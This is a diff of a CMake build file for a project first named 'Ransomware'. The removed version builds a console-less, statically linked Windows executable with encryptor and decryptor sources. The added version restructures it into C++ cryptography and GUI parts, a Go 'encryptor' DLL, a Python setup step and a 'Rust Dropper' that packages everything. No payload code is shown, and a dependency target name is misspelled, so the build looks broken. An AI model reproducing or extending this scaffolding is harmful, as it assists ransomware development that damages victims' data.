@@ -1,85 +1,50 @@
 cmake_minimum_required(VERSION 3.15)
-project(Ransomware VERSION 1.0 LANGUAGES CXX)
+project(RootProject)
 
-# Setze den C++ Standard
+# Set the C++ standard globally for all projects
 set(CMAKE_CXX_STANDARD 17)
 set(CMAKE_CXX_STANDARD_REQUIRED True)
 set(CMAKE_CXX_EXTENSIONS OFF)
 
-# Optional: Setze den Build-Typ
-if(NOT CMAKE_BUILD_TYPE)
-set(CMAKE_BUILD_TYPE Release)
-endif()
-
-# Füge Vcpkg als Toolchain hinzu
+# Add Vcpkg as a toolchain (if required)
 set(CMAKE_TOOLCHAIN_FILE "C:/Users/prang/.vcpkg-clion/vcpkg/scripts/buildsystems/vcpkg.cmake")
 set(VCPKG_TARGET_TRIPLET "x64-mingw-static")
 
-# Finde Qt-Pakete (stelle sicher, dass du statische Qt-Bibliotheken verwendest)
-find_package(Qt6 REQUIRED COMPONENTS Core Gui Widgets)
+# Set the common build folder
+set(CMAKE_RUNTIME_OUTPUT_DIRECTORY "${CMAKE_BINARY_DIR}/bin")
+set(CMAKE_LIBRARY_OUTPUT_DIRECTORY "${CMAKE_BINARY_DIR}/lib")
+set(CMAKE_ARCHIVE_OUTPUT_DIRECTORY "${CMAKE_BINARY_DIR}/lib")
 
-# Finde statische OpenSSL-Bibliotheken
-find_package(OpenSSL REQUIRED)
+# Add the C++ subdirectories
+add_subdirectory(Cpp_Cryptography)
+add_subdirectory(Cpp_Gui)
 
-# Füge die Quellverzeichnisse hinzu
-include_directories(
-src/utils
-src/logic
-src/gui
+# Set the dependency: FileVault depends on Cryptography
+add_dependencies(FileVault Cryptograhpy)
+
+# Compilation options
+add_compile_options(-Wall -Wextra)
+
+# Add Go DLL as a custom step
+add_custom_target(build_go_encryptor
+    COMMAND go build -o ${CMAKE_RUNTIME_OUTPUT_DIRECTORY}/cryptoLib.dll -buildmode=c-shared .
+    WORKING_DIRECTORY ${CMAKE_SOURCE_DIR}/Go_Multithreading
+    DEPENDS Cryptograhpy  # Go DLL depends on C++ Cryptography
 )
 
-# Setze die Quell- und Header-Dateien
-set(SOURCES
-src/main.cpp
-src/gui/MainWindow.cpp
-src/utils/SystemUtils.cpp
-src/utils/FileUtils.cpp
-        src/utils/KeyUtils.cpp
-src/logic/encryptor.cpp
-src/logic/decryptor.cpp
-src/utils/CryptoAes128.cpp
-src/utils/CryptoAes256.cpp
-src/gui/ui.cpp
-src/gui/functions.cpp
+# Python: No compilation needed, but add dependency
+add_custom_target(python_setup ALL
+    COMMAND pip install -r ${CMAKE_SOURCE_DIR}/Python_Scripts/requirements.txt
 )
 
-set(HEADERS
-src/gui/MainWindow.h
-src/utils/SystemUtils.h
-src/utils/FileUtils.h
-        src/utils/KeyUtils.h
-src/logic/encryptor.h
-src/logic/decryptor.h
-src/utils/CryptoAes128.h
-src/utils/CryptoAes256.h
+# Add Rust Dropper, which packages everything together
+add_custom_target(build_rust_dropper
+    COMMAND cargo build --release
+    WORKING_DIRECTORY ${CMAKE_SOURCE_DIR}/Rust_Dropper
+    DEPENDS build_go_encryptor FileVault
 )
 
-# Erstelle das Executable und stelle sicher, dass kein Konsolenfenster geöffnet wird
-add_executable(Ransomware WIN32 ${SOURCES} ${HEADERS})
-
-# Mache sicher, dass Qt MOC auf den Header-Dateien angewendet wird
-set_target_properties(Ransomware PROPERTIES
-AUTOMOC ON
-)
-
-# Verlinke die Qt-Bibliotheken und OpenSSL (statisch)
-target_link_libraries(Ransomware Qt6::Core Qt6::Gui Qt6::Widgets OpenSSL::SSL OpenSSL::Crypto)
-
-# Setze die Ausgabeverzeichnisse
-set_target_properties(Ransomware PROPERTIES
-RUNTIME_OUTPUT_DIRECTORY "${CMAKE_BINARY_DIR}/bin"
-LIBRARY_OUTPUT_DIRECTORY "${CMAKE_BINARY_DIR}/lib"
-ARCHIVE_OUTPUT_DIRECTORY "${CMAKE_BINARY_DIR}/lib"
-)
-
-# Füge die Version und andere Metadaten hinzu
-set_target_properties(Ransomware PROPERTIES
-VERSION ${PROJECT_VERSION}
-SOVERSION 1
-)
-
-# Statische Verlinkung erzwingen
-set(CMAKE_EXE_LINKER_FLAGS "-static")
-
-# Füge Kompilierungsoptionen hinzu (optional)
-target_compile_options(Ransomware PRIVATE -Wall -Wextra)
+# Ensure dependencies are built in the correct order
+add_dependencies(build_go_encryptor Cryptograhpy)
+add_dependencies(build_rust_dropper FileVault build_go_encryptor)
+add_dependencies(python_setup build_rust_dropper)
